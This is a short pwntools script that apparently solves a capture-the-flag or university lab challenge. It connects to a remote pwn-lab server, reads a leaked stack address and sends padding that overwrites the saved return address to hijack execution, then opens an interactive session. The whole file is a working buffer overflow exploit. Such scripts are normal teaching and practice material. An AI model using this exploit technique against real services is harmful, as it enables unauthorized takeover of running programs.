from pwn import *

# P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10151)
buffer = 0xffffce00
rip = 0xffffce1c
offset = rip - buffer

P.recvuntil(b'@ ')
output = P.recvuntil(b'\n').strip(b'\n')
output = int(output, 16)
P.sendline(b"A"* offset + p32(output))
P.interactive()